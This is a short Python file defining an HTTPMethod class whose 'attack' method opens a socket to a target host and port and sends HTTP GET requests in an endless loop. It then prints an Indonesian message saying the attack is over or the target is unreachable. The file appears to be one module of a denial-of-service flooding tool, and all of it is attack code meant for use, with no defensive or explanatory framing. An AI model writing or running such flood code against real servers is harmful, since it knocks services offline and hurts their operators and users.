import socket

class HTTPMethod:
    @staticmethod
    def attack(target, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            while True:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
        except:
            print("Serangan selesai atau target tidak dapat dijangkau.")
        finally:
            sock.close()